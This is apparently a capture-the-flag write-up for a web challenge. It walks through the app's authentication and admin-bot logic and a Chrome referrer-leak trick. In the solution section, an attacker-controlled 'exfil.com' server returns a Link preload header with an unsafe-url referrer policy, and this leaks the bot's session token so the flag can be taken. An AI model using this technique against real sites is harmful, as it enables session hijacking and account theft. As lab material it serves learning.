#### car seat HEADrest
- points earned: 449

#### Notes
- The creds are hardcoded into the app.  In `app/server.js` you can see:
	```javascript
	if (username === 'user' && password === 'demo123') { ... }
	```
	- I confirmed this by trying these creds in the live target.
- The location of the flag was a bit unclear at first but after a deeper review it became clear.
	- when A user logs in the flag is loaded into their backend session data if:
		- the login request contains a header `x-bot-secret`
		- and that the value of that header matches the value of the variable `botSecret`.
	- `botSecret` is loaded from an environment variable when the app runs.
- A user can send a POST request to `/auth/session/validate?token=` and IF that token belongs to a session that contains a flag then the session data will be returned to the user that sent the request.
	- So, If I can get the token for a session that has the flag, then I can get the flag.
	- I did not fully understand this at first and tunnel visioned on an XSS vector
- Behind the scenes, I found the auth mechanism particularly curious.
	- The user sends a POST request to `/login` to complete authentication.  If successful:
		- a `t` token and an `s` token are created and stored in a `sess` and `toks` Map respectively.
		- `toks` is a map from `t` token to `s` token
		- `sess` is a map from the `s` token to session data `{ username, email, role, authToken, flag, leakUrl }`
	- After passing authentication the user is redirected to `/auth/callback?token=`
		- This page does a few things:
			- sets a CSP
			- puts a `<meta>` redirect in some HTML
			- puts `leakImage` into the HTML if a `leakUrl` exists
			- then returns the HTML to the user
		- `leakImage` only gets created if `leakUrl` exists.  `leakUrl` will only exist if it was provided as a parameter to `/login`.
		- The whole `leakImage` mechanism is highly suspicious and screams `XSS`!  But this is a giant red herring and cost me some time.
			- The main reason I started looking elsewhere is because even if I got XSS to work here, then I'd still have to bypass the CSP `connect-src 'none'` rule which did not seem possible
	- After `/auth/callback?token=` the user gets redirected to `/dashboard`
- The bot is very bizarre and took me a little bit to digest the code.
	- The user triggers the bot by sending a POST request to `/submit` with a url.
	- The url gets passed through and makes it to the `run(url)` function.
	- At the start of this function execution gets sent to the `auth()` where the bot authenticates to the web app.
		- The bot uses the hardcoded creds to authenticate
		- It also uses the 'X-Bot-Secret' and sets it to the correct `botSecret` value.  So this session WILL contain the flag.
		- it also uses the provided url as the as `leakUrl` on the `/login` post
			- I found this pretty interesting because the bot is supposed to navigate to this page, but its using it as an image src.
	- After the authentication, the bot then calls `visit()` which effectively visits the url that was originally submitted.
		- It's worth noting that there's a lot of other stuff going on in `visit()` that i suspect to be part hints and part red herrings.
- After a review of the main app and the bot, I though the vector felt like it was an XSS on `/auth/callback` but I was struggling to get past a couple of things
	- I suspected that an XSS would occur on the `/auth/callback` page that would allow the bot to fetch `/auth/session/validate` where I could get the flag and fetch it back to an exfil server.  However, I couldn't fully wrap my head around this solution.
	- I couldn't actually get an XSS working here, although it was fun playing around with SVG XSS vectors
	- Even if I did get the XSS working, I'd still have to deal with CSP.
- I started to think about how I could go about getting the auth token,  If I can get this, then I can get the flag.
- In the bot code there's a bunch of references to the `referer` so I was curious if I could just leak the referer `/auth/callback?token=` to an exfil server.
	- I tried using exfil as the `leakUrl` but only got the hostname on the exfil server
	- I even tried editing the code on `/auth/callback` so it redirected back to exfil and that also only provided the hostname.
- At this point, I was running out of ideas so I decided to take a closer look at the Chrome version being used.  And that's where I found the juice.
	- Searching `issues.chromium.org` for `type:vulnerability referrer` I found https://issues.chromium.org/issues/415961179 where a comment referenced https://issues.chromium.org/issues/415810136 which referenced a slonser post https://x.com/slonser_/status/1919439373986107814.
	- All of this was related to leaking the referrer which seemed right.
	- The basic idea is that if my exil server returns a `Link` header then, when the target loads the site, it will send another request to the url referenced by the `Link` header that contains the complete referrer.  In the case of this challenge, it would contain the token needed to get the flag.

#### Solution
- setup an exfil server to return a `Link` header.  In flask, I did:
	```
	headers={ 'Link': '<https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"' }
	```
- Submit a link to the exfil server to `/submit`
	```
	https://exfil.com/meow
	```
- A request will be sent to the exfil server containing the auth token
- Send a POST request to `/auth/session/validate` with the token in the request body
- The flag will be in the response.